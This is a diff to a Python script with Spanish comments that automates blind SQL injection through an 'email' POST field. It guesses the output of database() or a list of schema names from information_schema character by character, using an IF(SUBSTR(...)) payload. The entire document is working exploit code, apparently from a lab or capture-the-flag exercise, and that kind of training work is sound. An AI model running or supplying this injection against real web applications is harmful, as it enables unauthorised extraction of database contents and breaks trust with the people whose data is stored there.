@@ -19,8 +19,11 @@ def main():
     return args.url
 
 url = main()
-
 characters = string.ascii_lowercase + string.digits + string.punctuation
+
+# contenido a buscar en la base de datos, colocado en el condicional if para evaluar sus caracteres
+search = "database()"
+#search = "SELECT group_concat(schema_name) from information_schema.schemata"
 
 # Se definen dos variables para detectar el fin de la cadena
 data0 = ""
@@ -33,12 +36,15 @@ time.sleep(1)
 
 p2 = log.progress("Data")
 
-
-for position in range(1, 50):
-
+position = 0
+while True:
+    position += 1
     for character in characters:
-        post_data = {"email": "' or 1=1 AND if((SUBSTR(user(),"+ str(position) +", 1)='"+ character +"'), 1, 0)-- -"}
-        
+        #time.sleep(0.2)
+        post_data = {"email": f"' or 1=1 AND if(SUBSTR(({search}),{position}, 1)='{character}', 1, 0)-- -"}
+
+        #SELECT IF(SUBSTR(GROUP_CONCAT(schema_name), 1, 1) = 'm', 1, 0) FROM information_schema.schemata;
+
         p1.status(post_data['email'])
 
         r = requests.post(url, data = post_data)
@@ -49,7 +55,5 @@ for position in range(1, 50):
             p2.status(data0)
             break
 
-    if data0 == data1:
-        break
-    else:
-        data1 = data0
+    if data0 == data1: break
+    data1 = data0
